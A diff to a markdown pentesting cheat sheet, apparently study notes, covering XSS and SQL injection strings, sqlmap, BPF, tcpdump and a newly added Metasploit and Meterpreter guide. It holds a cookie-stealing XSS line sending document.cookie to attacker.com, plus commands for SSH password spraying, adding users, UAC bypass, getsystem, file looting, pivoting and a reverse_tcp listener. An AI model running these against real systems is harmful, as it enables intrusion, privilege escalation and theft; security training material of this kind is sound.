@@ -61,9 +61,10 @@ $(echo Injected)
 ```
 
 ## XSS paste this simbols into parameters and check source code to see if they get printed back verbatim
-```
-(";!--"<XSS>=&{()}
+
+`(";!--"<XSS>=&{()}`
 Common XSS attacks
+```
 <script<alert('xss');</script>
 src=javascript:alert('XSS');
 <script>document.location='http://attacker.com/save.php?c='+document.cookie</script>
@@ -71,29 +72,26 @@ src=javascript:alert('XSS');
 
 
 ## SQL Injection
-```
-='or'='
-SQL command delimiter --
-SQL query terminator ;
-```
+`='or'='`
+SQL command delimiter `--`
+SQL query terminator `;`
+
 
 ## SQL map:
-```
-if you are gonna use sqlmap first go to the form, add someting to each form parameter (antything), and click submit (use the URL with the list of paramters for sqlmap to work with)
-sqlmap -u "http://domain/page/script.php?c=1&name=john&last=snow......" 
---dbs first to list databases
--D <database name> --tables   (to get table names)
-```
+If you are gonna use sqlmap first go to the form, add someting to each form parameter (anything), and click submit (use the URL with the FULL list of paramters for sqlmap to work with)
+`sqlmap -u "http://domain/page/script.php?c=1&name=john&last=snow......" `
+- `--dbs` first to list databases
+- `-D <database name> --tables`   (to get table names)
+
 	
 	
 ## BPF (berkley packet filter)
-```
-type: host, net, port, portrange
-dir: (direction) src, dst
-proto: ip, tcp, udp, icmp, etc
-operators: and &&, or ||, not !
-use parenthesis to group as needed
-```
+type: `host, net, port, portrange`
+dir: `src, dst`
+proto: `ip, tcp, udp, icmp, etc`
+operators: `and &&, or ||, not !`
+* use parenthesis to group as needed
+
 	
 ## tcpdump (pcapng supports comments):
 Uses BPF
@@ -113,10 +111,66 @@ e.g., `tcpdump -r <file.pcap> 'src host <ip>'`
 - Version Scan `-sV` for version will do more tests to get what service name. server, etc is running. (includded in -A command)
 
 
-
-
 ## Metasploit
 Practice searching for payload and exploits inside of metasploit: `search type:exploit psexec`
+- To load a module (exploit, auxiliary, paylaod, etc) `use <module name or ID from search results>`
+- To show information about loaded module `show info` or just `info`
+- To  only show the parameters of the loaded module `options`
+- To set a parameter value `set PARAM value`
+- To unser a parameter value `unset PARAM value`
+  - Common Parameters
+    - RHOSTS remote host, ussually the target
+    - LHOST  local host, ussually your attacker machine. You can use `set LHOST eth0` to auto complete the IP of your eth0 interface
+    - LPORT local port
+    - RPORT  remote port
+    - PAYLOAD  payload (where applicable) do 
+    - SESSION (for exploit that will be run on/through an existing meterpreter session, e.g, a persistence mechanism)
+
+- To send an existing meterpreter session to the background `backround` or `bg`. * note the session number displayed
+- To list existing sessions `sesssions`
+- To resume a backgrounded session `sessions -i#` (?)
+- To run or exploit a targer using the loaded module `run` or `exploit`
+- Routing traffic through a meterpreter session `route add <ip> <mask> <session number>`  all following traffic includding port scans toward CIDR in range will be forwarded through that meterpreter session. 
+  - To show existing routes use `route` for help `route -h`
+
+
+### Example Auxiliary Modules
+- Port scan:
+  - `use auxiliary/scanner/portscan/tcp`
+  - `set RHOSTS <CIDR or CSV>`
+  - `set PORTS <ran-ge or CSV>`
+  - run
+- HTTP Recon
+  - `use auxiliary/scanner/http/http_header`
+  - `set RHOSTS <CIDR or CSV>`
+  - `run`
+- ssh password spary
+  - `use scanner/ssh/ssh_login`
+  - `unset PASSWORD`
+  - `set PASS_FILE /path/to/passfile.txt`
+  - `run`
+
+	
+### Meterpreter:
+  - To start a system shell `shell`
+  - To get system info and the architecture that meterpreter is running on `sysinfo`
+  - To execute a system command  `execute -f <command>` to run the same command interactively (show output) `execute -if <command>` e.g., `execute -if net user /add <user> <password>`
+  - To search for files on the system `search -f *.txt`
+  - To elevate privileges of existing session:
+    - To migrate to a different process in the systeme `migrate -N <process name>` or `sessions -i <session number> -C "migrate -N <process name>"`.
+      - some exploits/modules need to run on processes of certain architecture (X86 x64) check current architecture of meterpreter session by running ` `
+    - Use a priviledge elevation exploit like a UAC bypass e.g., `exploit/windows/local/bypassuac_injection`
+    - Try `getsystem` to get local system privs
+  - To download/retrieve a file from the remote system `download file/path/loot.fl`
+  - Upload file to target `upload /local/file/path /dest/file.path`
+  - list running processes `ps`
+
+### Setting up listeners 
+- For payloads or persistence that will call back to the attack host and if needed choose to deliver a payload when connection is established:
+  - `use exploit\multi\handler`
+    - set a payload (optional) `set payload windows/meterpreter/reverse_tcp`
+    - `set lhost <your ip>`
+    - `run` and wait for connection back
 
 
 ## volatility
